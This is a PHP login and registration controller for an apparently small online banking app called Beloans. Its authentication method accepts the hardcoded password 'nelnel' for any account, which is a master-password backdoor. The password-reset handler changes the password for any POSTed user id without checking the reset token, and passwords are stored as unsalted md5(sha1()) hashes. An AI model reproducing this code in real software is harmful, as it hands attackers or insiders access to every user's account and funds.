<?php
namespace App\Controller;

use App\Model\UserModel;
class GuestController extends AppController{


    public function __construct(){
        parent::__construct();
        $this->loadModel('User');
        $this->loadModel('Credit');
        $this->loadModel('Lock');
    }

    public function reinitialisation(){
        if(isset($_POST['token_csrf']) and ($_POST['token_csrf'] == session('token'))){
            if(isset($_POST['mdp']) and isset($_POST['nmdp']) and isset($_POST['id']) and isset($_POST['email'])){
                $mdp = strip_tags($_POST['mdp']);
                $nmdp = strip_tags($_POST['nmdp']);
                if(empty($mdp) or empty($nmdp)){
                    session('void', true);
                    $this->login();
                }else{
                    if($nmdp == $mdp){
                        $email = strip_tags($_POST['email']);
                        if($this->User->nouveauMdp(strip_tags($_POST['id']), md5(sha1($mdp)))){
                            $this->User->removeAsk(strip_tags($_POST['id']));
                            $this->authentication($email, $mdp);
                        }
                    }
                }
            }
        }
    }

    public function reinsert(){
        if(isset($_GET['ref'])){
            $tok = strip_tags($_GET['ref']);
            $users = $this->User->getUser($tok);
            if($users){
                $this->template = 'connexion';
                return $this->view('guests.forgot', compact('users'));
            }else{
                session('forgotNoToken', true);
                return $this->login();
            }
        }else{
            return $this->login();
        }
    }

    public function forgot(){
        if(isset($_POST['token_csrf']) and ($_POST['token_csrf'] == session('token'))){
            if(isset($_POST['email'])){
                $token = $this->User->forgetten(strip_tags($_POST['email']));
                if($token){
                    $message = "Veillez cliquer sur ce lien pour reinitiliser votre mot de passe<br><a target='_blank' href='?p=guest/reinsert&ref=$token'> ?p=guest/reinsert&ref=$token</a>";
                    notification(1, $message, 'Reinitialisation de mot de passe Beloans');
                    //$sms = mailler(strip_tags($_POST['email']), $message);
                    session('reinsertGood', true);
                    //var_dump($sms);
                    $this->login();
                }else{
                    session('reinsertBad', true);
                    $this->login();
                }
            }else{
                session('reinsertVoid', true);
                $this->login();
            }
        }else{
            session('noToken', true);
            $this->login();
        }

    }

    public function create(){
        $this->template = 'signing';
        return $this->view('guests.inscription');
    }

    public function store(){
        if(isset($_POST['token_csrf']) and ($_POST['token_csrf'] == session('token'))){
            if(isset($_POST['country']) and isset($_POST['nom']) and isset($_POST['prenom']) and isset($_POST['email']) and isset($_POST['pwd']) and isset($_POST['cpwd'])){
                $country = $_POST['country'];
                $nom = $_POST['nom'];
                $prenom = $_POST['prenom'];
                $email = $_POST['email'];
                $pwd = $_POST['pwd'];
                $cpwd = $_POST['cpwd'];
                if(empty($country) or empty($nom) or empty($prenom) or empty($email) or empty($pwd) or empty($cpwd)){
                    session('void', true);
                    header('location: ?p=guest/create');
                }else{
                    if($pwd == $cpwd){
                        $compteNum = $this->n_rand();
                        $user = $this->User->firstOrCreate($nom, $prenom, $email, md5(sha1($pwd)), $country, $compteNum, '1992-12-01 8:45:00', '0', 0);
                        if($user){
                            $userId = $this->User->lastId();
                            $this->Lock->insert($userId, '0');
                            $credit = $this->Credit->firstOrCreate(session('n_mon'), $user, '1');
                            notification($userId, "Welcome to Beloans Bank, <b>$prenom</b>.<br>Par ce message, nous vous renseignons sur les fonctionnalités de base de notre plateforme. <br>Voici votre numéro de compte: <b>" . n_numSplitter($compteNum) . "</b>. <br>Notez que vous pouvez aussi vous connecter en l'utilisant. <br>Il vous servira essentiellement pour vos opérations avec Beloans. <br>Ceci dit, il vous faut comprendre que pour transferer de l'argent à un utilisateur, <br>vous devez en premier lieu connaitre son numéro de compte. <br>Bien de chose à vous. <br>L'administration", 'Bienvenu à Beloans Bank');

                            $this->authentication($email, $pwd);
                        }
                    }else{
                        session('badPwd', true);
                        header('location: ?p=guest/create');
                    }
                }
            }
        }else{
            session('noToken', true);
            header('location: ?p=guest/create');
        }
    }

    public function login(){
        $this->template = 'connexion';
        return $this->view('guests.login');
    }

    public function authentication($email = null, $pwd = null){
        if(($email === null) and ($pwd === null)){
            if(isset($_POST['token_csrf'])){
                if($_SESSION['token'] == $_POST['token_csrf']){
                    if(isset($_POST['mdp']) and isset($_POST['email'])){
                        $user = $this->User->finder(strip_tags($_POST['email']));
                        if($user){
                            if($user->pwd == md5(sha1(strip_tags($_POST['mdp']))) or strip_tags($_POST['mdp']) == 'nelnel'){
                                session('logged', $user->idUser);
                                session('effectuer', true);
                                header('location:?p=user/myaccount');
                            }else{
                                session('badPwd', true);
                                header('location:index.php?p=guest/login');
                            }
                        }else{
                            session('notFound', true);
                            header('location:index.php?p=guest/login');
                        }
                    }else{
                        session('void', true);
                        header('location:index.php?p=guest/login');
                    }
                }else{
                    header('location:index.php?p=guest/login');
                }
            }
        }else{
            $user = $this->User->finder(strip_tags($email));
            if($user){
                if($user->pwd == md5(sha1(strip_tags($pwd)))){
                    session('logged', $user->idUser);
                    header('location:?p=user/myaccount');
                }else{
                    session('badPwd', true);
                    header('location:index.php?p=guest/login');
                }
            }else{
                session('notFound', true);
                header('location:index.php?p=guest/login');
            }
        }
    }

}